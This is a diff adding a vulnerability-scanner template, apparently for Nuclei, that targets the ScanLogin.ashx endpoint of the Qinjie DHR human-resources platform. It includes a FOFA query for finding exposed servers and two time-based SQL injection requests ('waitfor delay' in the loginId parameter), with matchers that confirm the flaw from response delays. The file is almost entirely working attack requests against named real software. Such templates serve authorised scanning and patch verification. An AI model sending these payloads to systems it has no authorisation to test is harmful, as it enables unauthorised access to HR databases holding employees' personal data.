@@ -1,0 +1,23 @@
+id: qinjie-dhr-scanlogin-sqli
+info:
+  name: "勤杰DHR数智人力资源共享平台 ScanLogin.ashx 接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该平台ScanLogin.ashx接口处理逻辑存在SQL注入缺陷，攻击者可利用恶意构造的请求参数实现数据库敏感信息获取。
+      fofa: body="HandlerNoPri/ScanLogin.ashx"
+  tags: 勤杰DHR数智人力资源共享平台
+http:
+- raw:
+  - |
+    GET /HandlerNoPri/ScanLogin.ashx?Action=GetCodeStatus&loginId=%27;waitfor%20delay%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /HandlerNoPri/ScanLogin.ashx?Action=GetCodeStatus&loginId=%27;waitfor%20delay%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
